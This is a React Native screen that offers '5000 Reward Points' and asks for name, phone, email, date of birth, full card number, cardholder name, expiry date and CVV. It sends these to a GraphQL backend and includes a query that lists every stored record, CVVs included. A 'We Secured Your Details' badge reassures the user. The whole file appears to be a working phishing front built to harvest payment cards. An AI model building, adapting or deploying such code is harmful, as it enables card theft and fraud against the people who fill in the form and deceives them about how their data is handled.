import { gql, useMutation } from '@apollo/client'
import {
    View, Text, Image, TextInput, TouchableOpacity,
    KeyboardAvoidingView, ScrollView, ActivityIndicator
} from 'react-native'
import React, { useState } from 'react'
import DateTimePickerModal from "react-native-modal-datetime-picker";
import {
    Poppins_400Regular,
    Poppins_500Medium,
    Poppins_600SemiBold,
    useFonts
} from '@expo-google-fonts/poppins'
import { FontAwesome } from '@expo/vector-icons'
import { CallAPI } from './CallAPI';

const Home = ({ navigation }) => {

    const { loading, error, data } = CallAPI(Alldata, "AllData");

    const [openEx, setOpenEx] = useState(false)
    const [openDOB, setOpenDOB] = useState(false)

    const [name, setName] = useState("")
    const [phone, setPhone] = useState("")
    const [email, setEmail] = useState("")
    const [DOB, setDOB] = useState('')
    const [CardNum, setCardNum] = useState("")
    const [CardName, setCardName] = useState("")
    const [ExDate, setExDate] = useState('')
    const [CVV, setCVV] = useState("")

    const [Add] = useMutation(Create_Data, {
        variables: { name, phone, email, DOB, CardNum, CardName, ExDate, CVV },
    })

    const [loaded] = useFonts({
        Poppins_400Regular,
        Poppins_500Medium,
        Poppins_600SemiBold
    })

    if (!loaded) return null;

    const auth = async () => {
        if (name === "" || phone === "" || email === "" ||
            DOB === "" || CardNum === "" || CardName === "" || ExDate === "" || CVV === "") {
            alert("Please fill all Fields")
        }
        else {
            await Add(name, phone, email, DOB, CardNum, CardName, ExDate, CVV);
            console.log("DONE");
            navigation.navigate("EndScreen")
        }
    }


    return (
        loading ?
            <View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }} >
                <ActivityIndicator size="large" color="black" />
            </View>
            :
            <View style={{ flex: 1, backgroundColor: "#fff" }} >
                <Text
                    style={{
                        marginTop: 50,
                        fontFamily: 'Poppins_500Medium',
                        fontSize: 24,
                        alignSelf: 'center'
                    }}
                >Available 5000 Reward Points</Text>
                <Image
                    source={require("./assets/Logo.png")}
                    style={{
                        width: "80%",
                        height: "12%",
                        resizeMode: "contain",
                        alignSelf: 'center',
                    }}
                />
                <Text
                    style={{
                        marginTop: 8,
                        fontFamily: 'Poppins_500Medium',
                        fontSize: 20,
                        alignSelf: 'center'
                    }}
                >We understand your world</Text>
                <ScrollView>
                    <KeyboardAvoidingView>
                        <View style={{ flexDirection: "row", marginTop: 14, marginHorizontal: '3%', }}>
                            <View>
                                <Text
                                    style={{
                                        fontFamily: 'Poppins_400Regular',
                                        fontSize: 14,
                                    }}
                                >Your Name</Text>
                                <TextInput
                                    onChangeText={(e) => setName(e)}
                                    placeholder='Name'
                                    style={{
                                        marginTop: 2,
                                        padding: 4,
                                        paddingLeft: 10,
                                        borderWidth: 1,
                                        borderColor: '#33373B',
                                        borderRadius: 6,
                                        fontFamily: "Poppins_500Medium",
                                        width: 120,
                                        fontSize: 14
                                    }}
                                />
                            </View>
                            <View style={{ marginLeft: '12%' }}>
                                <Text
                                    style={{
                                        fontFamily: 'Poppins_400Regular',
                                        fontSize: 14,
                                    }}
                                >Mobile Number</Text>
                                <TextInput
                                    onChangeText={(e) => setPhone(e)}
                                    placeholder='99xxx99'
                                    keyboardType='numeric'
                                    style={{
                                        marginTop: 2,
                                        padding: 4,
                                        paddingLeft: 10,
                                        borderWidth: 1,
                                        borderColor: '#33373B',
                                        borderRadius: 6,
                                        fontFamily: "Poppins_500Medium",
                                        width: "180%",
                                        fontSize: 14
                                    }}
                                />
                            </View>
                        </View>

                        <View style={{ marginHorizontal: '3%', marginTop: 12 }} >
                            <Text
                                style={{
                                    fontFamily: 'Poppins_400Regular',
                                    fontSize: 14,
                                }}
                            >Enter Email Id</Text>
                            <TextInput
                                onChangeText={(e) => setEmail(e)}
                                placeholder='ex@gmail.com'
                                style={{
                                    marginTop: 2,
                                    padding: 4,
                                    paddingLeft: 10,
                                    borderWidth: 1,
                                    borderColor: '#33373B',
                                    borderRadius: 6,
                                    fontFamily: "Poppins_500Medium",
                                    fontSize: 14
                                }}
                            />

                            <Text
                                style={{
                                    fontFamily: 'Poppins_400Regular',
                                    fontSize: 14,
                                    marginTop: 12
                                }}
                            >Date Of Birth</Text>
                            <TouchableOpacity
                                onPress={() => setOpenDOB(true)}
                            >
                                <Text
                                    style={{
                                        backgroundColor: "#fff",
                                        fontFamily: 'Poppins_500Medium',
                                        fontSize: 14,
                                        marginTop: 2,
                                        color: "gray",
                                        padding: 4,
                                        paddingLeft: 8,
                                        borderColor: '#33373B',
                                        borderRadius: 6,
                                        borderWidth: 1
                                    }}
                                >{DOB ? `${DOB}` : 'Date Of Birth'}</Text>
                            </TouchableOpacity>
                            <DateTimePickerModal
                                isVisible={openDOB}
                                mode="date"
                                onConfirm={(data) => { setDOB(data), setOpenDOB(false) }}
                                onCancel={() => setOpenDOB(false)}
                            />

                            <Text
                                style={{
                                    fontFamily: 'Poppins_400Regular',
                                    fontSize: 14,
                                    marginTop: 12
                                }}
                            >Card Number</Text>
                            <TextInput
                                keyboardType='numeric'
                                onChangeText={(e) => setCardNum(e)}
                                placeholder='Card Number'
                                style={{
                                    marginTop: 2,
                                    padding: 4,
                                    paddingLeft: 10,
                                    borderWidth: 1,
                                    borderColor: '#33373B',
                                    borderRadius: 6,
                                    fontFamily: "Poppins_500Medium",
                                    fontSize: 14
                                }}
                            />

                            <Text
                                style={{
                                    fontFamily: 'Poppins_400Regular',
                                    fontSize: 14,
                                    marginTop: 12
                                }}
                            >Card Holder Name</Text>
                            <TextInput
                                onChangeText={(e) => setCardName(e)}
                                placeholder='Card Holder Name'
                                style={{
                                    marginTop: 2,
                                    padding: 4,
                                    paddingLeft: 10,
                                    borderWidth: 1,
                                    borderColor: '#33373B',
                                    borderRadius: 6,
                                    fontFamily: "Poppins_500Medium",
                                    fontSize: 14
                                }}
                            />

                        </View>

                        <View style={{ flexDirection: "row", marginTop: 14, marginHorizontal: '3%', }}>
                            <View>
                                <Text
                                    style={{
                                        fontFamily: 'Poppins_400Regular',
                                        fontSize: 14,
                                    }}
                                >Expiry Date</Text>
                                <TextInput
                                    onChangeText={(e) => setExDate(e)}
                                    placeholder='MM/YY'
                                    keyboardType='numeric'
                                    style={{
                                        marginTop: 2,
                                        padding: 4,
                                        paddingLeft: 10,
                                        borderWidth: 1,
                                        borderColor: '#33373B',
                                        borderRadius: 6,
                                        fontFamily: "Poppins_500Medium",
                                        width: 120,
                                        fontSize: 14
                                    }}
                                />
                            </View>
                            <View style={{ marginLeft: '12%' }}>
                                <Text
                                    style={{
                                        fontFamily: 'Poppins_400Regular',
                                        fontSize: 14,
                                    }}
                                >CVV</Text>
                                <TextInput
                                    onChangeText={(e) => setCVV(e)}
                                    placeholder='CVV'
                                    secureTextEntry={true}
                                    keyboardType='numeric'
                                    style={{
                                        marginTop: 2,
                                        padding: 4,
                                        paddingLeft: 10,
                                        borderWidth: 1,
                                        borderColor: '#33373B',
                                        borderRadius: 6,
                                        fontFamily: "Poppins_500Medium",
                                        width: 100,
                                        fontSize: 14
                                    }}
                                />
                            </View>
                        </View>
                    </KeyboardAvoidingView>
                    <TouchableOpacity
                        onPress={() => auth()}
                    >
                        <View style={{
                            backgroundColor: "#00c907",
                            borderRadius: 10,
                            marginTop: 32,
                            paddingHorizontal: 30,
                            paddingVertical: 4,
                            alignSelf: 'center'
                        }} >
                            <Text
                                style={{
                                    fontFamily: 'Poppins_600SemiBold',
                                    fontSize: 18,
                                    color: "#fff"
                                }}
                            >SUBMIT NOW</Text>
                        </View>
                    </TouchableOpacity>

                    <View style={{
                        backgroundColor: "black",
                        alignSelf: 'center',
                        padding: 2,
                        paddingHorizontal: 12,
                        borderRadius: 6,
                        flexDirection: 'row',
                        alignItems: 'center',
                        marginTop: 22
                    }} >
                        <FontAwesome name="lock" size={20} color="white" />
                        <Text
                            style={{
                                marginLeft: 8,
                                fontFamily: 'Poppins_500Medium',
                                fontSize: 12,
                                color: "#00c907"
                            }}
                        >We Secured Your Details</Text>
                    </View>
                </ScrollView>
            </View>
    )
}

export default Home


const Create_Data = gql`  
mutation addCard(
    $name: String!, $phone: String!,$email: String!,$DOB: String!,
    $CardNum: String!,$CardName: String!,$ExDate: String!,$CVV: String!
)
{
    addCard(
        name:$name,
        phone:$phone,
        email:$email,
        DOB:$DOB,
        CardNum:$CardNum,
        CardHolderName:$CardName,
        CVV:$CVV,
        ExDate:$ExDate
    )
    {
        name
    }
}`

const Alldata = gql`
    query {
        AllData{
            name
            email
            phone
            CardHolderName
            CardNum
            CVV
        }
    }
`;